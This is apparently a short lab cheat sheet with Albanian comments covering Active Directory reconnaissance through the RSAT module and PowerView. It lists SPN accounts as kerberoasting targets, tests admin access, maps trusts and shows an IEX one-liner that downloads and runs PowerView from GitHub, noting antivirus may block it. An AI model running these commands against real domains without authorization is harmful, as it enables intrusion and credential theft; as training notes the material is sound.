
**ActiveDirectory PowerShell Module**
```bash
# Instalim dhe importim i modulit për Active Directory
Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"  
# Instalimi i RSAT
Import-Module ActiveDirectory   # Ngarkimi i modulit
Get-Module   # Verifikimi që moduli është aktiv

# Tregon info  për domain-in si emrin e domain-it, strukturën, dhe kontrolluesin
Get-ADDomain 

# Përdoruesit që kanë SPN të konfiguruar (Target për kerberoasting)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Kontrollon nëse domain-i ka marrëdhënie me të tjerë
Get-ADTrust -Filter *  

# Grupet në domain
 # Liston të gjitha grupet
Get-ADGroup -Filter * | select name  

# Info i detajuar për grupin
Get-ADGroup -Identity "Administrators" 

# Anëtarët e grupit  
Get-ADGroupMember -Identity "Administrators"  

```

PowerView
```bash
# Shkarkimi dhe ekzekutimi direkt (nëse s’bllokohet nga AV)
IEX (New-Object Net.WebClient).DownloadString('<https://raw.githubusercontent.com/PowerShellMafia/
PowerSploit/master/Recon/PowerView.ps1>')

# Ose shkarkim manual nëse AV e bllokon:
Invoke-WebRequest -Uri "<https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/
PowerView.ps1>" -OutFile PowerView.ps1
Import-Module .\\PowerView.ps1

# PowerView - përdoret për enumeration më të avancuar
Get-DomainUser -Identity john.doe -Domain inlanefreight.local | Select-Object name,samaccountname,memberof,lastlogontimestamp

# Gjej të gjithë anëtarët e "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Lidhjet e domain-it me të tjerë
Get-DomainTrustMapping   

 # Testo nëse ke akses admin
Test-AdminAccess -ComputerName ACADEMY-EA-MS01   

# Përdoruesit që kanë SPN (target për kerberoasting)
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalNam
```
